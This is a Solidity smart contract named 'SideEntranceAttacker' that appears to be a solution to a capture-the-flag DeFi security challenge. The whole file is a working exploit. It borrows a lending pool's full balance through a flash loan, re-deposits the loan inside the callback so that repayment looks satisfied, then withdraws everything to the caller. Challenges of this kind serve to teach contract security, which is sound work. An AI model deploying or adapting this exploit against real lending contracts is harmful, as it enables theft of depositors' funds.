// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttacker {
    using Address for address payable;

    ISideEntranceLenderPool lender;

    function attack(ISideEntranceLenderPool _lender) external {
        lender = _lender;
        uint256 amount = address(lender).balance;
        lender.flashLoan(amount);
        lender.withdraw();
        msg.sender.sendValue(amount);
    } 

    function execute() external payable {
        lender.deposit{value: msg.value}();
    }

    receive() external payable {
        
    }
}